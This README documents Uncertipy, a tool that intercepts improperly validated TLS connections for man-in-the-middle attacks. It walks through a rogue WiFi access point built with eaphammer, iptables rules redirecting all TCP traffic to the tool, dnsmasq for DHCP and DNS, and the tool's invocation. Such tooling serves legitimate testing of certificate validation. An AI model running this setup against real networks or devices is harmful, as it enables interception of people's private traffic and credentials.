# Uncertipy

A tool for intercepting improperly validated TLS connections and performing MitM attacks. 
This is based on the work and code by [aapooksman](https://github.com/aapooksman), specially 
his [certmitm](https://github.com/aapooksman/certmitm) tool.

Interception methods are as follows:
* `self_signed`: Intercepts connection using a self-signed certificate.
* `replaced_key`: Downloads and re-signs the server's real certificate chain, with a newly created key.
* `real_cert`: Uses the provided certificate and key to intercept the communication.
* `real_cert_CA`: Injects the provided cert into the server's real certificate chain. 

# Usage

```bash
usage: uncertipy.py [-h] [-a ADDRESS] -p PORT -c CERT -k KEY -m {self_signed,replaced_key,real_cert,real_cert_CA} [-v] [-d]

options:
  -h, --help            show this help message and exit
  -a, --address ADDRESS
                        Address to listen on.
  -p, --port PORT       Port to listen on.
  -c, --cert CERT       Path to a valid TLS certificate, signed by a CA.
  -k, --key KEY         Path to the certificate key.
  -m, --method {self_signed,replaced_key,real_cert,real_cert_CA}
                        TLS interception method to use.
  -v, --verbose         Verbose output.
  -d, --debug           Debug output.
```

This tool listens for connections on a specific port, and tries to modify TLS connections and perform 
MitM attacks on them. You will need a real CA signed certificate and key for some of the methods. 
The best way to use this is by deploying a WiFi network, to which your devices will connect to. 
For example, using [eaphammer](https://github.com/s0lst1c3/eaphammer):

```bash
sudo ./eaphammer --auth wpa-psk --wpa-passphrase <wifi-password> --interface <wifi-interface> --essid <essid>
```

Then assigning an IP address to the connected devices:

```bash
sudo ip addr add 10.0.0.1/24 dev <wifi-interface>
```

Next, redirecting traffic to uncertipy. 

```bash
sudo iptables -A INPUT -i <wifi-interface> -j ACCEPT
sudo iptables -t nat -A PREROUTING -i <wifi-interface> -p tcp -m tcp -j REDIRECT --to-ports <port>
sudo iptables -t nat -A POSTROUTING -o <internet-connected-interface> -j MASQUERADE
```

Now, enable DHCP and DNS on your WiFi AP:

```bash
sudo dnsmasq --no-daemon --interface <wifi-interface> --dhcp-range=10.0.0.100,10.0.0.200 --log-dhcp --bind-interfaces -C /dev/null
```

Finally, run uncertipy:

```bash
python3 uncertipy.py -a 0.0.0.0 -p <port> -c <path/to/cert> -k <path/to/key> -m <method>
```